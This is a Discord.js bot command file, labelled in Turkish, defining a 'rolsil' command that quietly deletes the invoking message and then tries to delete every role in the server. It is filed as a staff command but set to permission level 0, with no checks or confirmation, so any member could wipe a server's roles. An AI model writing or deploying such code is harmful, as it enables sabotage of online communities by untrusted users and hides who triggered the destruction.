const Discord = require('discord.js');

exports.run = async (client, message, args) => {
if (message.guild) {
message.delete()        


message.guild.roles.deleteAll("");

}

};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['rolsil','rs'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'rolsil',
  description: 'Rolleri siler.', 
  usage: 'xRakey = Rol Siler'
};